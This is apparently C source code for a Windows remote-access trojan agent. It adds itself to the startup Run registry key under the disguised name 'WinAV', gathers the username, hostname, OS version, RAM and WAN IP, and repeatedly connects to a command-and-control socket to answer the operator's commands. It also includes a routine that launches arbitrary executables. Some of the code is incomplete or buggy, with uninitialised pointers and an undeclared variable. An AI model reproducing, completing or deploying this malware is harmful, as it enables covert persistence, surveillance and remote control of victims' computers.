#include "blackvision.h"

char username[UNLEN + 1];
char hostname[MAX_COMPUTERNAME_LENGTH + 1];
TCHAR DIR[MAX_PATH];
DWORD len = UNLEN + 1;
DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
char wanip[500];
SOCKET sockfd;
char recvbuf[BUFFER];
char* file_commands[5];
char* msgbox[5];
char* fcommands[5];
char* audio[5];
char* cmd[5];
char filebuf[BUFFER];
struct sockaddr_in server;
char* operatingSystem;
char* agentLocation;

void strsplit(char src[500], char* dest[5]) {
	int i = 0;
	char *p = strtok(src, "=");
	while (p != NULL)
	{
		dest[i++] = p;
		p = strtok(NULL, "=");
	}
}

void reconnect(void){
    closesocket(sockfd);
	WSACleanup();
	Sleep(INTERVAL);
	C2Connect();
}

void startup(void)
{
	TCHAR file[MAX_PATH];
	HKEY NewVal;
	int fpath = GetModuleFileName(NULL, file, MAX_PATH);
	if (fpath == 0)
	{
		return;
	}
	if (RegOpenKey(HKEY_CURRENT_USER, (LPCSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal) != ERROR_SUCCESS)
	{
		return;
	}
	if (RegSetValueEx(NewVal, (LPCSTR)"WinAV", 0, REG_SZ, (LPBYTE)file, sizeof(file)) != ERROR_SUCCESS)
	{
		return;
	}
	else {
		// std::cout << "Program added to Startup.\n";
		// Do nothing, Program was added to Startup
	}
	RegCloseKey(NewVal);

}

void ExecuteFile(char* filename)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcess((LPCSTR)filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void GetSysinfo(void){
    MEMORYSTATUSEX memstatx;
    OSVERSIONINFOEX osinfo;
    operatingSystem = malloc(150 * sizeof(char));
    char sysinfo[300];
    int fpath;
    memstatx.dwLength = sizeof(memstatx);
    GlobalMemoryStatusEx(&memstatx);
	ZeroMemory(&osinfo, sizeof(OSVERSIONINFOEX));
	osinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO)&osinfo);
	GetUserName(username, &len);
	GetComputerName(hostname, &hlen);
    float ramsize = memstatx.ullTotalPhys / (1024 * 1024);
    GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
    Wanip();
    switch(osinfo.dwMajorVersion){
        case 5:
            if (osinfo.dwMinorVersion == 0)
            {
                operatingSystem = "Windows 2000 ";
            }
            else if (osinfo.dwMinorVersion == 1)
            {
                operatingSystem = "Windows XP ";
            }
            else if (osinfo.dwMinorVersion == 2)
            {
                operatingSystem = "Windows XP ";
            }
		    break;
	    case 6:
            if (osinfo.dwMinorVersion == 3)
            {
                operatingSystem = "Windows 8.1 ";
            }
            else if (osinfo.dwMinorVersion == 2)
            {
                operatingSystem = "Windows 8 ";
            }
            else if (osinfo.dwMinorVersion == 1)
            {
                operatingSystem = "Windows 7 ";
            }
            else {
                operatingSystem = "Windows Vista ";
            }
            break;
        case 10:
            operatingSystem = "Windows 10 ";
            break;
        default:
            operatingSystem = "Unknown OS ";
    }

    fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
    if(fpath == 0){
        agentLocation = "(Failed to get Agent Location)";
    } else {
        snprintf(agentLocation, sizeof(DIR), "%s", DIR);
    }
    snprintf(sysinfo, 300, "Operating System : %s\nRAM : %.6f MB\nUsername : %s\nHostname : %s\nAgent Location : %s\nWAN IP : %s\n", operatingSystem, ramsize, username, hostname, agentLocation, wanip);
    printf("%s\n", sysinfo);
}

void Wanip(void){
    HINTERNET hInternet, hFile;
	DWORD rSize;
	if(InternetCheckConnection("http://www.google.com", 1, 0)){
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		hFile = InternetOpenUrl(hInternet, _T("http://bot.whatismyipaddress.com/"), NULL, 0, INTERNET_FLAG_RELOAD, 0);
		InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
		wanip[rSize] = '\0';

		InternetCloseHandle(hFile);
		InternetCloseHandle(hInternet);
	} else {
        snprintf(wanip, 100, "No Internet Connection. Failed to get WAN IP.");
    }
}

void C2Connect()
{
	while (true)
	{
		WSADATA wsa;
		DWORD timeout = 1000;
		if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { /* std::cout << "WSA Startup failed : " << WSAGetLastError() << std::endl; exit(1); */ return; };
		sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
		{
			// std::cout << "Failed to Create Socket : " << WSAGetLastError() << std::endl;
			// exit(1);
			return;
		}
		setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

		server.sin_addr.s_addr = inet_addr("127.0.0.1");
		server.sin_port = htons(1234);
		server.sin_family = AF_INET;

		do {
			if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
				// std::cout << "Connection failed : " << WSAGetLastError() << std::endl;
				reconnect();
			}
			else {
				connected = true;
				// std::cout << "Connection Established." << std::endl;
			}
		} while (!connected); // Not Connected, While not connected.

		ConnectionManage();
	}

}

void ConnectionManage()
{
	while (connected)
	{
        memset(recvbuf, '\0', BUFFER);
        int resc = recv(sockfd, recvbuf, BUFFER, 0);
        if (resc == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = false;
        }

        if(strcmp(recvbuf, "test") == 0){
            respond("Connection is OK!");
        } else if(strcmp(recvbuf, "os") == 0)
        {
            respond(operatingSystem);
        } else if(strcmp(recvbuf, "wanip") == 0)
        {
            char* strWan;
            snprintf(strWan, sizeof(wanip), "%s", wanip);
            respond(strWan);
        }
    }
}

void respond(const char* data)
{
	int totalsent = 0;
	int lerror = WSAGetLastError();
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = false;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}